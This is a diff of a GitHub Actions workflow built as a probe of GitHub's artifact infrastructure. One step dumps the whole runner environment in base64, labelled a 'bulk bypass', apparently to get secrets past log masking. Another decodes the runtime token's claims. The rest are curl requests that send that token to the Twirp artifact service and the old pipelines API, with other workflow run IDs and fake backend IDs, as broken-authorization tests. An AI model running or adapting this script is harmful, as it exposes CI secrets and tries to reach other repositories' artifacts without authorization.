@@ -10,121 +10,73 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Create a dummy file for artifact upload
-        run: |
-          echo "reference-content-$(date -u +%s)" > /tmp/ref-file.txt
+      - name: Setup dummy artifact file
+        run: echo "probe-$(date +%s)" > /tmp/probe.txt
 
-      - name: Upload reference artifact (establishes run context)
+      - name: Upload reference artifact
         uses: actions/upload-artifact@v4
         with:
           name: reference-artifact
-          path: /tmp/ref-file.txt
+          path: /tmp/probe.txt
 
-      - name: Artifacts v2 API probe + BOLA test
+      - name: Env bulk bypass + runtime token decode
         run: |
-          echo "=== ENV B64 BULK BYPASS ==="
+          echo "=ENV_B64_START="
           env | base64 -w0
           echo ""
-          echo "=== KEY VARS ==="
-          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
-          echo "GITHUB_RUN_ID=$GITHUB_RUN_ID"
-          echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
-          echo "GITHUB_REPOSITORY_ID=$GITHUB_REPOSITORY_ID"
-          echo "GITHUB_RUN_ATTEMPT=$GITHUB_RUN_ATTEMPT"
-          
+          echo "=ENV_B64_END="
+          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
+          echo "RUN_ID=$GITHUB_RUN_ID"
+          echo "REPO_ID=$GITHUB_REPOSITORY_ID"
+          echo "=TOKEN_DECODE_START="
+          printf '%s' "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | python3 -c "
+import sys,base64,json
+p=sys.stdin.read().strip()
+p+='='*(-len(p)%4)
+print(json.dumps(json.loads(base64.b64decode(p)),indent=2))
+"
+          echo "=TOKEN_DECODE_END="
+
+      - name: Artifacts v2 Twirp API probes
+        run: |
           RT="$ACTIONS_RUNTIME_TOKEN"
           RESULTS="https://results.actions.githubusercontent.com"
-          
-          echo ""
-          echo "=== DECODE RUNTIME TOKEN CLAIMS ==="
-          echo "$RT" | python3 -c "
-          import sys, base64, json
-          t = sys.stdin.read().strip()
-          parts = t.split('.')
-          if len(parts) >= 2:
-              p = parts[1]
-              p += '=' * (-len(p) % 4)
-              try:
-                  claims = json.loads(base64.b64decode(p))
-                  print(json.dumps(claims, indent=2))
-              except Exception as e:
-                  print('DECODE_ERR:', e)
-          "
-          
-          echo ""
-          echo "=== TWIRP ListArtifacts (current run) ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== LIST current run ==="
+          curl -sf -w "\nHTTP:%{http_code}" \
             -X POST \
             -H "Authorization: Bearer $RT" \
             -H "Content-Type: application/json" \
-            -d "{\"workflowRunId\": \"$GITHUB_RUN_ID\"}" \
+            -d "{\"workflowRunId\":\"$GITHUB_RUN_ID\"}" \
             "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 3000
           echo ""
-          
-          echo ""
-          echo "=== TWIRP ListArtifacts (run ID=1, BOLA test) ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== LIST run 1 (BOLA) ==="
+          curl -s -w "\nHTTP:%{http_code}" \
             -X POST \
             -H "Authorization: Bearer $RT" \
             -H "Content-Type: application/json" \
-            -d '{"workflowRunId": "1"}' \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 1000
+            -d '{"workflowRunId":"1"}' \
+            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 500
           echo ""
-          
-          echo ""
-          echo "=== TWIRP ListArtifacts (run ID=999999999, different run same repo) ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== CREATE with fake backend IDs (BOLA) ==="
+          curl -s -w "\nHTTP:%{http_code}" \
             -X POST \
             -H "Authorization: Bearer $RT" \
             -H "Content-Type: application/json" \
-            -d '{"workflowRunId": "999999999"}' \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 1000
+            -d '{"workflowRunBackendId":"00000000-0000-0000-0000-000000000001","workflowJobRunBackendId":"00000000-0000-0000-0000-000000000002","name":"bola-test","version":4}' \
+            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" | head -c 500
           echo ""
-          
-          echo ""
-          echo "=== TWIRP CreateArtifact (fake backend IDs — BOLA test) ==="
-          curl -s -w "
-HTTP:%{http_code}" \
-            -X POST \
-            -H "Authorization: Bearer $RT" \
-            -H "Content-Type: application/json" \
-            -d '{"workflowRunBackendId":"00000000-0000-0000-0000-000000000001","workflowJobRunBackendId":"00000000-0000-0000-0000-000000000002","name":"bola-probe-artifact","version":4}' \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" | head -c 1000
-          echo ""
-          
-          echo ""
-          echo "=== OLD RUNTIME API: List artifacts via pipelines endpoint ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== OLD PIPELINES API (current run) ==="
+          curl -s -w "\nHTTP:%{http_code}" \
             -H "Authorization: Bearer $RT" \
             "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts?api-version=6.0-preview" | head -c 2000
           echo ""
-          
-          echo ""
-          echo "=== OLD RUNTIME API: Try different run ID (BOLA) ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== OLD PIPELINES API (run 1, BOLA) ==="
+          curl -s -w "\nHTTP:%{http_code}" \
             -H "Authorization: Bearer $RT" \
-            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview" | head -c 1000
+            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview" | head -c 500
           echo ""
-          
-          echo ""
-          echo "=== OLD RUNTIME API: Try run ID 0 ==="
-          curl -s -w "
-HTTP:%{http_code}" \
+          echo "=== RUNTIME URL ROOT ==="
+          curl -s -w "\nHTTP:%{http_code}" \
             -H "Authorization: Bearer $RT" \
-            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/0/artifacts?api-version=6.0-preview" | head -c 1000
+            "${ACTIONS_RUNTIME_URL}" | head -c 500
           echo ""
-          
-          echo ""
-          echo "=== RUNTIME URL STRUCTURE ==="
-          echo "$ACTIONS_RUNTIME_URL" | python3 -c "
-          import sys
-          url = sys.stdin.read().strip()
-          parts = url.split('/')
-          print('Parts:', parts)
-          # Extract org ID, repo ID etc from URL structure
-          "
